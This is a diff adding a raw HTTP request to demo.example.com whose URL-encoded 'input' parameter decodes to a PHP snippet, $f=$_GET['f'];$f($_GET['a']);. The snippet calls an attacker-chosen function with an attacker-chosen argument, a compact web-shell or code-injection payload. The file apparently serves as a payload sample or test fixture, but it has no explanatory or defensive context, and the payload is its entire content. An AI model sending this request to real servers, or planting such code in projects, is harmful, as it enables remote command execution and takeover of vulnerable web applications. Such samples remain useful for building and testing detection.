@@ -1,0 +1,4 @@
+GET /a?input=%24f%3D%24_GET%5B%27f%27%5D%3B%24f%28%24_GET%5B%27a%27%5D%29%3B HTTP/1.1
+Host: demo.example.com
+Connection: close
+
